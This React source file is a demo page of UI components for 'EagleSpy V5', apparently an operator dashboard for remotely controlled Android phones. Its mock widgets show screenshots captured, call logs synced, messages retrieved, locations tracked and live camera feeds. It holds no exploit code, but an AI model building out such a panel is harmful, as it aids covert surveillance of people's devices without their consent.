import { useState } from 'react';
import {
  SplitScreen,
  PiPPanel,
  WidgetGrid,
  ResizablePanels,
  ContextMenu,
  KeyboardShortcutsPanel,
  defaultShortcuts,
  Widget,
  PanelConfig,
  MenuItem,
} from '../components/advanced';
import { useAdvancedStore } from '../stores';
import {
  Layout,
  Grid,
  Terminal,
  Camera,
  MessageSquare,
  Settings,
  Activity,
  Users,
  BarChart3,
} from 'lucide-react';

export const AdvancedDemo: React.FC = () => {
  const [activeDemo, setActiveDemo] = useState<string>('split-screen');
  const [showPiP, setShowPiP] = useState(false);
  const [showKeyboardShortcuts, setShowKeyboardShortcuts] = useState(false);
  const { shortcutsPanelOpen, toggleShortcutsPanel } = useAdvancedStore();

  // Demo Widgets
  const demoWidgets: Widget[] = [
    {
      id: 'device-status',
      title: 'Device Status',
      component: (
        <div className="space-y-2">
          <div className="flex justify-between">
            <span className="text-gray-400">Active Devices</span>
            <span className="text-green-400 font-bold">24</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-400">Offline Devices</span>
            <span className="text-red-400 font-bold">3</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-400">Total Sessions</span>
            <span className="text-blue-400 font-bold">187</span>
          </div>
        </div>
      ),
      defaultSize: { w: 4, h: 2 },
      minSize: { w: 2, h: 2 },
    },
    {
      id: 'active-sessions',
      title: 'Active Sessions',
      component: (
        <div className="space-y-2">
          <div className="p-2 bg-gray-700 rounded">
            <div className="text-white text-sm">Device #1234 - Camera Feed</div>
            <div className="text-gray-400 text-xs">Started 2h ago</div>
          </div>
          <div className="p-2 bg-gray-700 rounded">
            <div className="text-white text-sm">Device #5678 - Terminal</div>
            <div className="text-gray-400 text-xs">Started 15m ago</div>
          </div>
        </div>
      ),
      defaultSize: { w: 4, h: 2 },
      minSize: { w: 2, h: 2 },
    },
    {
      id: 'recent-activity',
      title: 'Recent Activity',
      component: (
        <div className="space-y-1 text-sm">
          <div className="text-gray-300">📷 Screenshot captured from Device #1234</div>
          <div className="text-gray-300">📞 Call log synced from Device #5678</div>
          <div className="text-gray-300">💬 Messages retrieved from Device #9012</div>
          <div className="text-gray-300">📍 Location updated for Device #3456</div>
        </div>
      ),
      defaultSize: { w: 4, h: 2 },
      minSize: { w: 3, h: 2 },
    },
    {
      id: 'system-health',
      title: 'System Health',
      component: (
        <div className="grid grid-cols-4 gap-4">
          <div className="text-center">
            <div className="text-2xl font-bold text-green-400">98%</div>
            <div className="text-gray-400 text-xs">Uptime</div>
          </div>
          <div className="text-center">
            <div className="text-2xl font-bold text-blue-400">45ms</div>
            <div className="text-gray-400 text-xs">Latency</div>
          </div>
          <div className="text-center">
            <div className="text-2xl font-bold text-yellow-400">2.3GB</div>
            <div className="text-gray-400 text-xs">Memory</div>
          </div>
          <div className="text-center">
            <div className="text-2xl font-bold text-purple-400">1.2K</div>
            <div className="text-gray-400 text-xs">Requests</div>
          </div>
        </div>
      ),
      defaultSize: { w: 12, h: 2 },
      minSize: { w: 6, h: 2 },
    },
  ];

  // Demo Panels
  const demoPanels: PanelConfig[] = [
    {
      id: 'devices',
      title: 'Devices',
      content: (
        <div className="space-y-2">
          <div className="p-3 bg-gray-800 rounded-lg">Device #1234 - Active</div>
          <div className="p-3 bg-gray-800 rounded-lg">Device #5678 - Active</div>
          <div className="p-3 bg-gray-800 rounded-lg">Device #9012 - Offline</div>
        </div>
      ),
      defaultSize: 30,
      minSize: 20,
      collapsible: true,
    },
    {
      id: 'content',
      title: 'Main Content',
      content: (
        <div className="h-full flex items-center justify-center text-gray-400">
          <div className="text-center">
            <Terminal size={48} className="mx-auto mb-4" />
            <p>Main content area - resize panels to see behavior</p>
          </div>
        </div>
      ),
      defaultSize: 50,
      minSize: 30,
    },
    {
      id: 'details',
      title: 'Details',
      content: (
        <div className="space-y-3">
          <div>
            <div className="text-gray-400 text-sm">Model</div>
            <div className="text-white">Samsung Galaxy S21</div>
          </div>
          <div>
            <div className="text-gray-400 text-sm">OS Version</div>
            <div className="text-white">Android 13</div>
          </div>
          <div>
            <div className="text-gray-400 text-sm">Battery</div>
            <div className="text-white">78%</div>
          </div>
        </div>
      ),
      defaultSize: 20,
      minSize: 15,
      collapsible: true,
    },
  ];

  // Context Menu Items
  const contextMenuItems: MenuItem[] = [
    { id: 'view', label: 'View Details', icon: <Layout size={14} />, onClick: () => alert('View Details') },
    { id: 'edit', label: 'Edit', icon: <Settings size={14} />, onClick: () => alert('Edit') },
    { id: 'divider1', label: '', divider: true },
    {
      id: 'actions',
      label: 'Actions',
      icon: <Activity size={14} />,
      submenu: [
        { id: 'restart', label: 'Restart', onClick: () => alert('Restart') },
        { id: 'shutdown', label: 'Shutdown', onClick: () => alert('Shutdown') },
      ],
    },
    { id: 'divider2', label: '', divider: true },
    { id: 'delete', label: 'Delete', icon: <MessageSquare size={14} />, onClick: () => alert('Delete') },
  ];

  // Split Screen render function
  const renderSplitPane = (deviceId: string | undefined, paneIndex: number) => (
    <div className="h-full flex items-center justify-center bg-gray-800 p-8">
      <div className="text-center">
        <Camera size={64} className="mx-auto mb-4 text-blue-400" />
        <h3 className="text-white text-xl mb-2">Pane {paneIndex + 1}</h3>
        <p className="text-gray-400">Device ID: {deviceId || 'Not selected'}</p>
        <p className="text-gray-500 text-sm mt-4">
          This would show device content in split view
        </p>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gray-900 p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-white mb-2">Advanced UI Components</h1>
          <p className="text-gray-400">
            Interactive demonstration of advanced EagleSpy V5 components
          </p>
          <button
            onClick={() => setShowKeyboardShortcuts(true)}
            className="mt-4 px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-white text-sm"
          >
            View Keyboard Shortcuts (?)
          </button>
        </div>

        {/* Component Selector */}
        <div className="mb-6 flex gap-2 flex-wrap">
          {[
            { id: 'split-screen', label: 'Split Screen', icon: <Grid size={16} /> },
            { id: 'pip', label: 'Picture-in-Picture', icon: <Camera size={16} /> },
            { id: 'widget-grid', label: 'Widget Grid', icon: <Layout size={16} /> },
            { id: 'resizable-panels', label: 'Resizable Panels', icon: <BarChart3 size={16} /> },
            { id: 'context-menu', label: 'Context Menu', icon: <MessageSquare size={16} /> },
          ].map((demo) => (
            <button
              key={demo.id}
              onClick={() => setActiveDemo(demo.id)}
              className={`px-4 py-2 rounded-lg flex items-center gap-2 transition-colors ${
                activeDemo === demo.id
                  ? 'bg-blue-600 text-white'
                  : 'bg-gray-800 text-gray-300 hover:bg-gray-700'
              }`}
            >
              {demo.icon}
              {demo.label}
            </button>
          ))}
        </div>

        {/* Demo Content */}
        <div className="bg-gray-800 rounded-lg overflow-hidden" style={{ height: '600px' }}>
          {activeDemo === 'split-screen' && (
            <SplitScreen
              orientation="vertical"
              defaultSizes={[50, 50]}
              device1Id="device-1234"
              device2Id="device-5678"
              syncScroll={false}
              renderPane={renderSplitPane}
            />
          )}

          {activeDemo === 'pip' && (
            <div className="relative h-full p-8 flex items-center justify-center">
              <div className="text-center">
                <p className="text-gray-400 mb-4">Click the button to show a PiP panel</p>
                <button
                  onClick={() => setShowPiP(true)}
                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-white"
                >
                  Show PiP Panel
                </button>
              </div>
              {showPiP && (
                <PiPPanel
                  title="Live Camera Feed"
                  defaultPosition={{ x: window.innerWidth - 420, y: 80 }}
                  defaultSize={{ width: 400, height: 300 }}
                  onClose={() => setShowPiP(false)}
                >
                  <div className="h-full flex items-center justify-center bg-gray-950">
                    <div className="text-center">
                      <Camera size={48} className="mx-auto mb-2 text-blue-400" />
                      <p className="text-gray-400">Camera feed would appear here</p>
                      <p className="text-gray-500 text-sm mt-2">Drag, resize, minimize, maximize</p>
                    </div>
                  </div>
                </PiPPanel>
              )}
            </div>
          )}

          {activeDemo === 'widget-grid' && (
            <div className="p-4 h-full overflow-auto">
              <WidgetGrid
                widgets={demoWidgets}
                editable={true}
                cols={12}
                rowHeight={80}
              />
            </div>
          )}

          {activeDemo === 'resizable-panels' && (
            <ResizablePanels
              direction="horizontal"
              panels={demoPanels}
              storageKey="demo-panels"
            />
          )}

          {activeDemo === 'context-menu' && (
            <div className="h-full flex items-center justify-center p-8">
              <ContextMenu items={contextMenuItems} trigger={
                <div className="p-8 bg-gray-700 rounded-lg cursor-pointer hover:bg-gray-600 transition-colors">
                  <Users size={48} className="mx-auto mb-4 text-blue-400" />
                  <p className="text-white text-center">Right-click me to open context menu</p>
                </div>
              } />
            </div>
          )}
        </div>

        {/* Usage Examples */}
        <div className="mt-8 bg-gray-800 rounded-lg p-6">
          <h2 className="text-xl font-bold text-white mb-4">Usage Example</h2>
          <pre className="bg-gray-900 p-4 rounded-lg overflow-x-auto">
            <code className="text-sm text-gray-300">
              {activeDemo === 'split-screen' && `import { SplitScreen } from '@/components/advanced';

<SplitScreen
  orientation="vertical"
  defaultSizes={[50, 50]}
  device1Id="device-1234"
  device2Id="device-5678"
  syncScroll={false}
  renderPane={(deviceId, paneIndex) => (
    <DeviceView deviceId={deviceId} />
  )}
  onClose={() => setShowSplit(false)}
/>`}
              {activeDemo === 'pip' && `import { PiPPanel } from '@/components/advanced';

<PiPPanel
  title="Live Camera Feed"
  defaultPosition={{ x: 100, y: 100 }}
  defaultSize={{ width: 400, height: 300 }}
  minSize={{ width: 200, height: 150 }}
  onClose={() => setShowPiP(false)}
>
  <CameraFeed deviceId="device-1234" />
</PiPPanel>`}
              {activeDemo === 'widget-grid' && `import { WidgetGrid, Widget } from '@/components/advanced';

const widgets: Widget[] = [
  {
    id: 'device-status',
    title: 'Device Status',
    component: <DeviceStatus />,
    defaultSize: { w: 4, h: 2 },
  },
  // ... more widgets
];

<WidgetGrid
  widgets={widgets}
  editable={true}
  cols={12}
  rowHeight={80}
  onLayoutChange={(layout) => console.log(layout)}
/>`}
              {activeDemo === 'resizable-panels' && `import { ResizablePanels, PanelConfig } from '@/components/advanced';

const panels: PanelConfig[] = [
  {
    id: 'sidebar',
    title: 'Devices',
    content: <DeviceList />,
    defaultSize: 30,
    collapsible: true,
  },
  // ... more panels
];

<ResizablePanels
  direction="horizontal"
  panels={panels}
  storageKey="my-layout"
/>`}
              {activeDemo === 'context-menu' && `import { ContextMenu, MenuItem } from '@/components/advanced';

const items: MenuItem[] = [
  {
    id: 'view',
    label: 'View Details',
    icon: <Eye />,
    onClick: () => handleView(),
  },
  { id: 'divider', label: '', divider: true },
  // ... more items
];

<ContextMenu
  items={items}
  trigger={<DeviceCard device={device} />}
/>`}
            </code>
          </pre>
        </div>
      </div>

      {/* Keyboard Shortcuts Panel */}
      <KeyboardShortcutsPanel
        isOpen={showKeyboardShortcuts}
        onClose={() => setShowKeyboardShortcuts(false)}
        shortcuts={defaultShortcuts}
        mode="modal"
      />
    </div>
  );
};
